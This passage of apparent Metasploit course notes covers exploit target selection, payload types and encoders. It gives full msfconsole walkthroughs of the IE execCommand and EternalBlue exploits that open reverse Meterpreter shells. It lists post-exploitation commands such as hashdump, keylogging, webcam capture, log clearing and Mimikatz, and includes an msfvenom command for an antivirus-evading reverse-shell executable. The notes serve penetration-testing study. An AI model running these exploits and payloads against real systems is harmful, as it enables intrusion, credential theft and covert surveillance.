    - After selecting a target, configure module options to match the environment. For `ie_execcommand_uaf`:
        
        ```
        set SRVHOST 192.168.1.100
        set SRVPORT 8080
        set URIPATH /exploit
        set OBFUSCATE true
        
        ```
        
        - These settings ensure the exploit’s web server is accessible and the payload is obfuscated to evade detection.
6. **Document Findings**:
    - Record the selected target, options, and exploit results for reporting or future reference.
    - Save console output to a file:
        
        ```
        spool /path/to/logfile.txt
        
        ```
        

### Advanced Considerations

- **Target Identification Challenges**:
    - **Dynamic Environments**: Modern systems with ASLR (Address Space Layout Randomization) or DEP (Data Execution Prevention) may require additional techniques, such as ROP (Return-Oriented Programming) chains, to bypass protections.
    - **Custom Targets**: If none of the predefined targets match, advanced users can modify the exploit module to add a new target by specifying a custom return address. This requires:
        - Analyzing the target binary with `msfpescan` or a debugger (e.g., Immunity Debugger).
        - Editing the module’s Ruby code to include the new target definition.
        - Example:
            
            ```ruby
            'Targets' => [
              ['Custom Windows 7 IE 9 (Japanese)', { 'Ret' => 0x12345678, 'Offset' => 100 }],
              ...
            ]
            
            ```
            
- **Exploit Development**:
    - The document hints at future modules covering exploit development and target identification. For `ie_execcommand_uaf`, this involves:
        - Understanding the use-after-free vulnerability in `execCommand`.
        - Crafting a payload that leverages the specific memory layout of IE 7/8/9 on different Windows versions.
        - Using tools like [Mona.py](http://mona.py/) (with Immunity Debugger) to find reliable return addresses or ROP gadgets.
- **Auditing Exploit Code**:
    - Always review the exploit module’s source code for potential issues, such as:
        - **Artifact Generation**: Unintended files or network traffic that could alert defenders.
        - **Additional Features**: Hidden functionality that might harm the target or attacker’s system.
    - Example: For `ie_execcommand_uaf`, check the Ruby code for how it constructs the malicious HTML page and ensure it aligns with the intended attack vector.

### Example Workflow: Exploiting MS12-063

1. **Select the Exploit**:
    
    ```
    msf6 > use exploit/windows/browser/ie_execcommand_uaf
    
    ```
    
2. **Check Targets**:
    
    ```
    msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
    Exploit targets:
    Id  Name
    --  ----
    0   Automatic
    1   IE 7 on Windows XP SP3
    2   IE 8 on Windows XP SP3
    3   IE 7 on Windows Vista
    4   IE 8 on Windows Vista
    5   IE 8 on Windows 7
    6   IE 9 on Windows 7
    
    ```
    
3. **Gather Target Information**:
    - Use reconnaissance to confirm the target’s OS and browser version. For example, if the target is running Windows 7 with IE 9, select target ID 6:
        
        ```
        msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
        target => 6
        
        ```
        
4. **Configure Options**:
    - Set the attacker’s IP and port for the exploit’s web server:
        
        ```
        set SRVHOST 192.168.1.100
        set SRVPORT 8080
        set OBFUSCATE true
        
        ```
        
5. **Run the Exploit**:
    - Start the exploit, which launches a web server hosting the malicious page:
        
        ```
        msf6 exploit(windows/browser/ie_execcommand_uaf) > exploit
        [*] Exploit running as background job 0.
        [*] Started reverse TCP handler on 192.168.1.100:4444
        [*] Using URL: <http://192.168.1.100:8080/exploit>
        [*] Server started.
        
        ```
        
    - Direct the target to visit the URL (e.g., via phishing or DNS spoofing). If successful, a session is opened:
        
        ```
        [*] Command shell session 1 opened (192.168.1.100:4444 -> <target_ip>:<port>)
        
        ```
        
6. **Interact with the Session**:
    
    ```
    msf6 > sessions -i 1
    
    ```
    

### Common Issues and Troubleshooting

- **Exploit Fails**:
    - **Wrong Target**: Verify the target’s OS and browser version match the selected target. Use reconnaissance tools to confirm.
    - **Incorrect Return Address**: If the exploit crashes the target, the return address may be invalid. Use `msfpescan` to find a new address or try a different target.
    - **Network Issues**: Ensure the target can reach the exploit’s web server (check `SRVHOST` and `SRVPORT`).
    - **Security Protections**: Modern systems may block the exploit due to ASLR, DEP, or antivirus. Try enabling `OBFUSCATE` or using a different payload.
- **No Check Support**:
    - For modules like `ie_execcommand_uaf` (where `Check supported: No`), manually verify the target’s vulnerability using external tools or by testing in a lab.
    - Example: Browse to a test page with the target’s IE version to confirm the `execCommand` vulnerability.
- **Target Mismatch**:
    - If the target’s configuration (e.g., language pack, custom patches) doesn’t match any predefined target, the exploit may fail. Consider modifying the module or using a different exploit.

### Ethical and Practical Notes

- **Ethical Use**: Only use Metasploit and its exploits in authorized environments, such as client engagements or personal labs. Unauthorized exploitation is illegal and unethical.
- **Lab Setup**: Practice in a controlled environment with VMs running vulnerable configurations (e.g., Windows XP SP3 with IE 7). Use Metasploitable3 or custom VMs for safe testing.
- **Stay Updated**: Regularly update Metasploit with `msfupdate` to access the latest modules and target definitions.
- **Learn the Vulnerability**: For `ie_execcommand_uaf`, study the use-after-free bug (CVE-2012-4969) to understand its mechanics. Refer to:
    - Microsoft’s MS12-063 bulletin: [https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/ms12-063](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/ms12-063)
    - CVE details: [https://nvd.nist.gov/vuln/detail/CVE-2012-4969](https://nvd.nist.gov/vuln/detail/CVE-2012-4969)

### Next Steps

- **Explore Exploit Development**:
    - Learn how to create custom targets by analyzing binaries and defining return addresses.
    - Study stack-based buffer overflows (referenced in the document) to understand return address mechanics.
- **Practice with Other Exploits**:
    - Test other browser-based exploits (e.g., `exploit/windows/browser/ms10_002_aurora`) to compare target selection processes.
    - Experiment with SMB exploits (e.g., `ms17_010_psexec`) to contrast server-side vs. client-side exploitation.
- **Deepen Reconnaissance Skills**:
    - Use tools like Nmap, Nessus, or Metasploit’s auxiliary modules to improve target identification accuracy.
- **Audit Modules**:
    - Regularly review exploit code for reliability and safety, especially for client engagements.

## 6. Metasploit Payloads

**Focus**: Explains the role of payloads in Metasploit, their types (Singles, Stagers, Stages), and how they are used to achieve objectives like establishing a shell or executing commands on a target system. The document also details the Meterpreter payload and provides a practical example of configuring and using a payload with the MS17-010 EternalBlue exploit.

### Key Points with Explanations

### Overview of Payloads

- **Definition**: A payload in Metasploit is a module that works with an exploit module to perform a specific task on the target system, typically establishing a shell or executing code to gain a foothold. The exploit bypasses the vulnerable service’s normal operation, while the payload runs on the target OS to achieve the attacker’s objective (e.g., reverse shell, command execution).
- **Role**:
    - **Exploit**: Bypasses the target’s defenses to gain code execution.
    - **Payload**: Executes the desired action, such as opening a reverse connection to the attacker or running a specific command.
- **Types**: Payloads are categorized into three types: **Singles**, **Stagers**, and **Stages**. These types determine how the payload is delivered and executed.

### Payload Types

1. **Singles**:
    - **Description**: Self-contained payloads that include both the exploit and the full shellcode for the task. They are executed immediately on the target without requiring additional components.
    - **Characteristics**:
        - **Stable**: Contain everything in one package, reducing dependency on network conditions.
        - **Large Size**: Can be too large for some exploits, as they include all necessary code.
        - **Examples**: Adding a user, starting a process, or executing a simple command.
        - **Naming**: Indicated by no forward slash (/) in the payload name (e.g., `windows/shell_bind_tcp`).
    - **Use Case**: Ideal for simple tasks or when network reliability is uncertain, but limited by size constraints in some exploits.
2. **Stagers**:
    - **Description**: Small payloads designed to establish a network connection between the attacker and the target. They set up the initial communication channel and download a larger payload (Stage).
    - **Characteristics**:
        - **Small and Reliable**: Optimized for size and stability, making them suitable for constrained environments.
        - **Network-Dependent**: Require a stable connection to download the Stage.
        - **Examples**: `reverse_tcp`, `bind_tcp`, `reverse_http`.
        - **Naming**: Indicated by a forward slash (/) in the payload name, where the first part is the Stager (e.g., `windows/shell/reverse_tcp`).
    - **Windows NX vs. NO-NX Stagers**:
        - **NX CPUs and DEP**: NX (Non-Executable) memory protections and DEP (Data Execution Prevention) can cause reliability issues. NX Stagers are larger as they use `VirtualAlloc` to allocate executable memory.
        - **Default**: Modern Metasploit defaults to NX-compatible Stagers that work with Windows 7 and later.
    - **Use Case**: Used when the exploit requires a small initial payload to establish a connection, followed by a more capable Stage.
3. **Stages**:
    - **Description**: Larger payload components downloaded by Stagers. They provide advanced functionality with no size limits.
    - **Characteristics**:
        - **Feature-Rich**: Support complex tasks like Meterpreter, VNC injection, or PowerShell sessions.
        - **Middle Stagers**: For large Stages, a middle Stager is used to handle the download process, improving reliability.
        - **Examples**: Meterpreter, VNC, PowerShell.
    - **Process**:
        - Stager establishes the connection.
        - Middle Stager (if needed) downloads the full Stage.
        - Stage executes, providing advanced capabilities.
    - **Use Case**: Ideal for advanced post-exploitation tasks requiring extensive functionality, such as persistence or data exfiltration.
- **Staged vs. Single Payloads**:
    - **Staged Payloads**: Modular, with separate Stager and Stage components. They are compact initially, aiding in AV/IPS evasion, but require multiple steps to complete.
    - **Single Payloads**: All-in-one, simpler but larger, potentially triggering detection or failing in size-constrained exploits.
    - **Naming Convention**: A forward slash (/) indicates a Staged payload (e.g., `windows/meterpreter/reverse_tcp`), while no slash indicates a Single payload (e.g., `windows/shell_bind_tcp`).

### Meterpreter Payload

- **Description**: A versatile, multi-faceted payload that uses DLL injection to create a stable, in-memory connection to the target. It is designed to be stealthy, persistent, and feature-rich.
- **Characteristics**:
    - **In-Memory Execution**: Runs entirely in memory, leaving no traces on the hard drive, making it difficult to detect with traditional forensic tools.
    - **Persistence**: Survives reboots or system changes (if configured properly).
    - **Dynamic Loading**: Supports loading scripts and plugins dynamically for additional functionality.
    - **Session-Based**: Creates a Meterpreter session, providing a command-line interface similar to `msfconsole` but focused on the target system.
- **Capabilities**:
    - **File System**: Navigate directories (`cd`, `ls`), upload/download files, edit files, etc.
    - **Networking**: View network interfaces (`ifconfig`), manage routing tables (`route`), forward ports (`portfwd`).
    - **System**: Execute commands, manage processes (`ps`, `kill`), clear event logs (`clearev`), steal tokens (`steal_token`).
    - **User Interface**: Capture screenshots, log keystrokes (`keyscan_start`), interact with webcams (`webcam_snap`).
    - **Privilege Escalation**: Attempt to gain SYSTEM privileges (`getsystem`), dump password hashes (`hashdump`).
    - **Audio/Visual**: Record audio (`record_mic`), stream webcam video (`webcam_stream`), play audio files (`play`).
- **Plugins**: Supports extensions like Mimikatz for credential harvesting, enhancing its utility in penetration tests.
- **Use Case**: Preferred for advanced post-exploitation tasks requiring persistence, stealth, and extensive control over the target.

### Searching for Payloads

- **Command**: `show payloads` lists all available payloads, either globally or within a selected exploit module.
    - **Global**: Without an exploit selected, lists all payloads across platforms (e.g., Windows, Linux, Android).
    - **Within Exploit**: Filters payloads compatible with the exploit’s target platform (e.g., Windows for `ms17_010_eternalblue`).
- **Example**:
    
    ```
    msf6 > show payloads
    Payloads:
    0  aix/ppc/shell_bind_tcp
    1  aix/ppc/shell_find_port
    ...
    544 windows/x64/meterpreter/reverse_tcp
    ...
    
    ```
    
- **Filtering**:
    - Use `grep` to narrow down payloads. For example, to find Meterpreter payloads for a TCP-based reverse shell:
        
        ```
        msf6 > show payloads | grep meterpreter
        payload/windows/x64/meterpreter/reverse_tcp
        payload/windows/x64/meterpreter/reverse_http
        ...
        
        ```
        
    - This helps identify payloads like `windows/x64/meterpreter/reverse_tcp` for Windows 64-bit targets.

### Selecting a Payload

- **Command**: `set payload <payload_name>` selects a payload for the current exploit module.
- **Example**:
    
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    
    ```
    
- **Considerations**:
    - **Objective**: Choose a payload based on the goal (e.g., Meterpreter for persistence, `exec` for command execution).
    - **Compatibility**: Ensure the payload matches the target’s architecture (e.g., x64 for Windows 7/Server 2008 R2).
    - **Network**: Select `reverse_tcp` for NAT environments, `bind_tcp` for direct access, or `reverse_http`/`reverse_https` for stealth.

### Configuring Payloads

- **Key Parameters**:
    - **LHOST**: The attacker’s IP address (where the reverse connection will connect).
    - **LPORT**: The attacker’s listening port (default: 4444, but can be changed if in use).
    - **EXITFUNC**: Determines how the payload exits (e.g., `thread`, `seh`, `process`).
- **Example Configuration**:
    
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
    LHOST => 10.10.14.15
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
    LPORT => 4444
    
    ```
    
- **Verify LHOST**:
    - Use `ifconfig` within `msfconsole` to confirm the attacker’s IP:
        
        ```
        msf6 > ifconfig
        tun0: ... inet 10.10.14.15 netmask 255.255.254.0 ...
        
        ```
        

### Practical Example: MS17-010 EternalBlue with Meterpreter

- **Exploit Module**: `exploit/windows/smb/ms17_010_eternalblue`
- **Target**: Windows 7 or Server 2008 R2 (x64), all service packs.
- **Payload**: `windows/x64/meterpreter/reverse_tcp`
- **Workflow**:
    1. **Select Exploit**:
        
        ```
        msf6 > use exploit/windows/smb/ms17_010_eternalblue
        
        ```
        
    2. **Check Options**:
        
        ```
        msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
        Module options:
          Name           Current Setting  Required  Description
          ----           ---------------  --------  -----------
          RHOSTS                          yes       The target host(s)
          RPORT          445              yes       The target port (TCP)
          SMBDomain                       no        (Optional) The Windows domain
          SMBPass                         no        (Optional) The password
          SMBUser                         no        (Optional) The username
          VERIFY_ARCH    true             yes       Check if remote architecture matches
          VERIFY_TARGET  true             yes       Check if remote OS matches
        Payload options (windows/x64/meterpreter/reverse_tcp):
          Name      Current Setting  Required  Description
          ----      ---------------  --------  -----------
          EXITFUNC  thread           yes       Exit technique
          LHOST                      yes       The listen address
          LPORT     4444             yes       The listen port
        Exploit target:
          Id  Name
          --  ----
          0   Windows 7 and Server 2008 R2 (x64) All Service Packs
        
        ```
        
    3. **Set Payload**:
        
        ```
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
        payload => windows/x64/meterpreter/reverse_tcp
        
        ```
        
    4. **Configure Parameters**:
        - Set the target’s IP (`RHOSTS`) and attacker’s IP (`LHOST`):
            
            ```
            msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
            RHOSTS => 10.10.10.40
            msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
            LHOST => 10.10.14.15
            
            ```
            
        - Verify `RPORT` (445 for SMB) and `LPORT` (4444, or change if needed).
    5. **Run the Exploit**:
        
        ```
        msf6 exploit(windows/smb/ms17_010_eternalblue) > run
        [*] Started reverse TCP handler on 10.10.14.15:4444
        [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
        [*] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional
        [*] 10.10.10.40:445 - Connecting to target for exploitation.
        [*] 10.10.10.40:445 - Connection established for exploitation.
        [*] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
        [*] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
        [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
        [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
        [*] 10.10.10.40:445 - Starting non-paged pool grooming
        [*] 10.10.10.40:445 - Sending SMBv2 buffers
        [*] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer
        [*] 10.10.10.40:445 - Sending final SMBv2 buffers.
        [*] 10.10.10.40:445 - Sending last fragment of exploit packet!
        [*] 10.10.10.40:445 - Receiving response from exploit packet
        [*] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
        [*] 10.10.10.40:445 - Sending egg to corrupted connection.
        [*] 10.10.10.40:445 - Triggering free of corrupted buffer.
        [*] Sending stage (201283 bytes) to 10.10.10.40
        [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14
        
        ```
        
    6. **Interact with Meterpreter**:
        - Access the Meterpreter session:
            
            ```
            msf6 > sessions -i 1
            meterpreter > whoami
            nt authority\\system
            meterpreter > cd Users
            meterpreter > ls
            Listing: C:\\Users
            Mode              Size  Type  Last modified       Name
            ----              ----  ----  -------------       ----
            40777/rwxrwxrwx   dir   21/07/2017 07:56    Administrator
            40777/rwxrwxrwx   dir   21/07/2017 07:56    Public
            ...
            
            ```
            
        - Perform tasks like dumping hashes:
            
            ```
            meterpreter > hashdump
            
            ```
            
        - Capture a screenshot:
            
            ```
            meterpreter > screenshot
            
            ```
            

### Common Payload Types for Windows

- **Table of Common Payloads**:
    
    
    | Payload | Description |
    | --- | --- |
    | `generic/custom` | Generic listener, multi-use, customizable for specific tasks. |
    | `generic/shell_bind_tcp` | Normal shell, binds to a TCP port on the target for a basic command shell. |
    | `generic/shell_reverse_tcp` | Normal shell, initiates a reverse TCP connection to the attacker. |
    | `windows/x64/exec` | Executes an arbitrary command on the target (x64 architecture). |
    | `windows/x64/loadlibrary` | Loads an arbitrary x64 library path on the target. |
    | `windows/x64/messagebox` | Displays a customizable MessageBox dialog (title, text, icon). |
    | `windows/x64/shell_reverse_tcp` | Single payload, normal shell with reverse TCP connection. |
    | `windows/x64/shell/reverse_tcp` | Staged payload, normal shell with reverse TCP connection. |
    | `windows/x64/shell/bind_ipv6_tcp` | Staged payload, normal shell binding to an IPv6 TCP port. |
    | `windows/x64/meterpreter/*` | Meterpreter payload with variants (e.g., `reverse_tcp`, `reverse_http`). |
    | `windows/x64/powershell/*` | Interactive PowerShell sessions with variants (e.g., `reverse_tcp`). |
    | `windows/x64/vncinject/*` | VNC server with reflective injection, supports variants (e.g., `reverse_tcp`). |
- **Notes**:
    - **Meterpreter Variants**: Include `reverse_tcp`, `reverse_http`, `reverse_https`, `bind_tcp`, etc., offering flexibility for different network environments.
    - **PowerShell Payloads**: Useful for environments where PowerShell is prevalent, allowing script execution and automation.
    - **VNC Payloads**: Provide remote desktop access, ideal for visual interaction with the target.

### Other Payloads

- **Empire and Cobalt Strike**: Advanced payloads used by professional penetration testers for high-value targets. They offer features like custom communication protocols and enhanced persistence but are not covered in this document.
- **Vendor-Specific Payloads**: For devices like Cisco, Apple, or PLCs, requiring specialized knowledge.
- **Custom Payloads**: Can be generated using tools like `msfvenom` for tailored attacks.

### Meterpreter Commands

- **Categories and Examples**:
    - **File System**:
        - `cat`: Read a file’s contents.
        - `cd`, `ls`, `pwd`: Navigate and list directories.
        - `upload`, `download`: Transfer files.
        - `mkdir`, `rm`: Create or delete directories/files.
    - **Networking**:
        - `ifconfig`, `ipconfig`: Display network interfaces.
        - `netstat`: List network connections.
        - `portfwd`: Forward a local port to a remote service.
        - `route`: Manage routing tables.
    - **System**:
        - `execute`: Run a command.
        - `getpid`, `getuid`: Get process ID or user ID.
        - `getsystem`: Attempt privilege escalation to SYSTEM.
        - `hashdump`: Dump SAM database hashes.
        - `clearev`: Clear event logs.
    - **User Interface**:
        - `screenshot`: Capture the desktop.
        - `keyscan_start`, `keyscan_dump`: Log and retrieve keystrokes.
        - `setdesktop`: Switch desktops.
    - **Webcam/Audio**:
        - `webcam_snap`, `webcam_stream`: Capture or stream webcam.
        - `record_mic`: Record audio.
        - `play`: Play a WAV file.
    - **Privilege Escalation**:
        - `getsystem`: Elevate to SYSTEM privileges.
        - `steal_token`: Impersonate another process’s token.
    - **Miscellaneous**:
        - `shell`: Drop into a Windows command shell.
        - `migrate`: Move to another process for stability.
        - `load`: Load Meterpreter extensions (e.g., Mimikatz).

### Practical Tips for Working with Payloads

1. **Choose the Right Payload**:
    - Use Meterpreter for advanced post-exploitation (e.g., persistence, credential harvesting).
    - Use `exec` or `messagebox` for simple tasks or proof-of-concept.
    - Select `reverse_tcp` for NAT environments, `bind_tcp` for direct access, or `reverse_http`/`reverse_https` for stealth.
2. **Verify Compatibility**:
    - Ensure the payload matches the target’s architecture (x86 vs. x64) and OS.
    - Check the exploit’s payload restrictions (e.g., size limits for Singles).
3. **Optimize for Evasion**:
    - Use Staged payloads for smaller initial footprints to evade AV/IPS.
    - Enable encryption (e.g., `reverse_tcp_rc4`, `reverse_https`) to reduce detection.
    - Consider `OBFUSCATE` options in browser-based exploits (as seen in `ie_execcommand_uaf`).
4. **Test in a Lab**:
    - Set up VMs with vulnerable configurations (e.g., Windows 7 for MS17-010) to practice payload delivery.
    - Use Metasploitable3 or custom VMs to simulate real-world scenarios.
5. **Handle Network Issues**:
    - If the reverse connection fails, try a different `LPORT` or payload variant (e.g., `reverse_http` instead of `reverse_tcp`).
    - Ensure the attacker’s IP (`LHOST`) is reachable from the target.
6. **Leverage Meterpreter**:
    - Use Meterpreter for stealth and flexibility, especially with commands like `hashdump`, `screenshot`, or `getsystem`.
    - Load plugins like Mimikatz for advanced credential harvesting:
        
        ```
        meterpreter > load mimikatz
        
        ```
        
7. **Document Sessions**:
    - Record session details (e.g., session ID, commands executed) for reporting.
    - Use `spool` to save console output:
        
        ```
        msf6 > spool /path/to/logfile.txt
        
        ```
        

### Common Issues and Troubleshooting

- **Payload Fails to Execute**:
    - **Incompatible Payload**: Verify the payload matches the target’s architecture and OS.
    - **Size Restrictions**: Switch to a Staged payload if the Single payload is too large.
    - **AV/IPS Detection**: Use encrypted payloads (e.g., `reverse_tcp_rc4`) or encode with `msfvenom`.
- **Connection Issues**:
    - **Firewall/NAT**: Ensure `LHOST` and `LPORT` are accessible. Use `reverse_http` or `reverse_https` for better NAT traversal.
    - **Port Conflict**: Change `LPORT` if 4444 is in use:
        
        ```
        set LPORT 5555
        
        ```
        
- **Session Drops**:
    - **Process Termination**: Migrate to a stable process:
        
        ```
        meterpreter > migrate <pid>
        
        ```
        
    - **Network Instability**: Use `transport` to switch to a more reliable protocol:
        
        ```
        meterpreter > transport add -t reverse_http
        
        ```
        
- **Meterpreter Limitations**:
    - Some commands require elevated privileges. Use `getsystem` to escalate:
        
        ```
        meterpreter > getsystem
        
        ```
        
    - If a command fails, check the target’s configuration (e.g., webcam availability for `webcam_snap`).

### Ethical and Practical Notes

- **Ethical Use**: Only use payloads in authorized environments (e.g., client engagements, personal labs). Unauthorized use is illegal and unethical.
- **Lab Setup**: Practice with VMs running vulnerable configurations (e.g., Windows 7 for MS17-010). Use Metasploitable3 or custom VMs for safe testing.
- **Stay Updated**: Update Metasploit with `msfupdate` to access the latest payloads and fixes.
- **Learn the Vulnerability**: For MS17-010, study the EternalBlue exploit (CVE-2017-0144) to understand its mechanics:
    - Microsoft Bulletin: [https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010)
    - CVE Details: [https://nvd.nist.gov/vuln/detail/CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)

### Next Steps

- **Explore Encoders**:
    - The document mentions encoders as the next topic. Learn how tools like `msfvenom` can encode payloads to evade detection.
    - Example: Encode a Meterpreter payload to bypass AV:
        
        ```
        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe
        
        ```
        
- **Advanced Payloads**:
    - Research Empire and Cobalt Strike for professional penetration testing techniques.
    - Experiment with vendor-specific payloads (e.g., Cisco, Apple) or custom payloads generated with `msfvenom`.
- **Meterpreter Plugins**:
    - Explore plugins like Mimikatz, Incognito, or Espia for advanced post-exploitation.
    - Example: Load Mimikatz to extract credentials:
        
        ```
        meterpreter > load mimikatz
        meterpreter > kerberos
        
        ```
        
- **Post-Exploitation**:
    - Practice Meterpreter commands for persistence (e.g., `run persistence`), privilege escalation, and data exfiltration.
    - Use `post` modules to automate tasks:
        
        ```
        msf6 > use post/windows/gather/hashdump
        
        ```
        

---

## 7. Metasploit Encoders

**Focus**: Explains the role of encoders in the Metasploit Framework, their use in ensuring payload compatibility across architectures, removing bad characters, and historically aiding AV evasion. The document details the Shikata Ga Nai encoder, its limitations in modern contexts, and provides practical examples of encoding payloads with `msfvenom`.

### Key Points with Explanations

### Overview of Encoders

- **Definition**: Encoders are Metasploit modules that transform payloads to ensure compatibility with different processor architectures (e.g., x86, x64, SPARC, PPC, MIPS) and to avoid issues like bad characters. They historically assisted with AV evasion by altering payload signatures.
- **Primary Roles**:
    1. **Architecture Compatibility**: Modify payloads to run on specific operating systems and processor architectures.
    2. **Bad Character Removal**: Eliminate hexadecimal opcodes (bad characters) that could cause the payload to crash or fail during exploitation.
    3. **AV Evasion (Historical)**: Encode payloads in formats that reduce detection by AV, IPS, or IDS systems, though this is less effective today due to improved detection mechanisms.
- **Evolution**:
    - Early in Metasploit’s history (pre-2015), encoders were critical for AV evasion, with tools like `msfpayload` and `msfencode` used separately.
    - Modern AV/IPS systems use advanced signature-based and behavioral detection, reducing the effectiveness of encoders alone for evasion.
    - Encoders remain essential for compatibility and bad character handling.

### Shikata Ga Nai Encoder

- **Description**: A polymorphic XOR additive feedback encoder, historically one of the most effective for AV evasion due to its ability to generate unique payload signatures with each encoding iteration.
- **Name Meaning**: Japanese for “nothing can be done about it,” reflecting its past reputation as nearly undetectable.
- **Mechanism**:
    - Uses XOR operations with a dynamic key to obfuscate the payload.
    - Polymorphic: Generates different shellcode each time, even for the same payload, making signature-based detection harder.
    - Supports multiple iterations to increase obfuscation.
- **Example Output** (from document, page 3):
    
    ```
    00000000  d5 cf d9 74 24 f4 98 2b c9 b1 98 bb e7 23 68 a3
    00000010  31 58 18 83 60 04 03 38 15 c1 94 52 12 87 56 a0
    ...
    
    ```
    
    - This represents the encoded shellcode for a payload, with no XOR key specified and one iteration.
- **Current Limitations**:
    - Modern AV/IPS systems detect Shikata Ga Nai-encoded payloads, even with multiple iterations.
    - Example: A payload encoded once with Shikata Ga Nai was detected by 54 AV engines on VirusTotal (page 6).
    - Multiple iterations (e.g., 10) still resulted in detection by 52 AV engines, indicating limited effectiveness today.

### Historical Context (Pre-2015)

- **Tools**:
    - **msfpayload**: Generated raw payloads for specific architectures and platforms.
    - **msfencode**: Encoded payloads to match target requirements or evade AV.
    - Located in `/usr/share/framework2` (as noted in the document).
- **Workflow**:
    - Generate a payload with `msfpayload`.
    - Pipe the output to `msfencode` to apply an encoder.
    - Example (from document, page 1):
        
        ```
        msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -e x86/shikata_ga_nai
        [*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
        my $buf =
        "\\x86\\x9a\\x92\\x91\\x31\\x70\\x17\\x83\\x60\\x94\\x93\\x70\\x13\\x62\\x4"
        ...
        
        ```
        
    - This creates a `windows/shell_reverse_tcp` payload, encoded with Shikata Ga Nai, producing a raw buffer for use in exploits.
- **Modern Equivalent**: `msfvenom` combines the functionality of `msfpayload` and `msfencode`, streamlining payload generation and encoding.

### Selecting an Encoder

- **Command**: `show encoders` lists encoders compatible with the selected exploit and payload combination.
- **Example with MS17-010 EternalBlue** (from document, page 3):
    
    ```
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
    Compatible Encoders
    ==================
    Name                     Disclosure Date  Rank    Check  Description
    ----                     ---------------  ----    -----  -----------
    generic/eicar                            manual  No     The EICAR Encoder
    generic/none                             manual  No     The "none" Encoder
    x64/xor                                  manual  No     XOR Encoder
    x64/xor_dynamic                          manual  No     Dynamic key XOR Encoder
    x64/zutto_dekiru                         manual  No     Zutto Dekiru
    
    ```
    
    - Only x64-compatible encoders are shown, filtered by the exploit (`ms17_010_eternalblue`) and payload (`windows/x64/meterpreter/reverse_tcp`).
- **Example with MS09-050** (from document, page 4):
    
    ```
    msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show encoders
    Compatible Encoders
    ==================
    Name                     Disclosure Date  Rank    Description
    ----                     ---------------  ----    -----------
    generic/none                             normal  The "none" Encoder
    x86/alpha_mixed                          low     Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper                          low     Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_utf8_tolower                   manual  Avoid UTF8/tolower
    x86/call4_dword_xor                      normal  Call+4 Dword XOR Encoder
    x86/context_cpuid                        manual  CPUID-based Context Keyed Payload Encoder
    x86/context_stat                         manual  stat(2)-based Context Keyed Payload Encoder
    x86/context_time                         manual  time(2)-based Context Keyed Payload Encoder
    x86/countdown                            normal  Single-byte XOR Countdown Encoder
    x86/fnstenv_mov                          normal  Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive                    normal  Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                             low     Non-Alpha Encoder
    x86/nonupper                             low     Non-Upper Encoder
    x86/shikata_ga_nai                       excellent Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit                    manual  Single Static Bit
    x86/unicode_mixed                        manual  Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper                        manual  Alpha2 Alphanumeric Unicode Uppercase Encoder
    
    ```
    
    - This exploit (`ms09_050_smb2_negotiate_func_index`) supports x86 payloads, so more encoders (e.g., `x86/shikata_ga_nai`, `x86/alpha_mixed`) are available.
- **Notes**:
    - Encoders are automatically filtered based on the exploit and payload architecture.
    - Rankings (e.g., `excellent`, `normal`, `low`) indicate the encoder’s effectiveness or complexity, with `x86/shikata_ga_nai` rated `excellent` due to its historical polymorphism.

### Using `msfvenom` for Encoding

- **Description**: `msfvenom` is the modern tool for generating and encoding payloads, replacing `msfpayload` and `msfencode`.
- **Syntax**:
    
    ```
    msfvenom -a <architecture> --platform <platform> -p <payload> [OPTIONS] -e <encoder> [-i <iterations>] -f <format> -o <output_file>
    
    ```
    
    - `a`: Architecture (e.g., `x86`, `x64`).
    - `-platform`: Target platform (e.g., `windows`, `linux`).
    - `p`: Payload (e.g., `windows/meterpreter/reverse_tcp`).
    - `e`: Encoder (e.g., `x86/shikata_ga_nai`).
    - `i`: Number of encoding iterations.
    - `f`: Output format (e.g., `exe`, `raw`, `c`, `powershell`).
    - `o`: Output file name.
- **Example 1: Single Iteration** (from document, page 4):
    
    ```
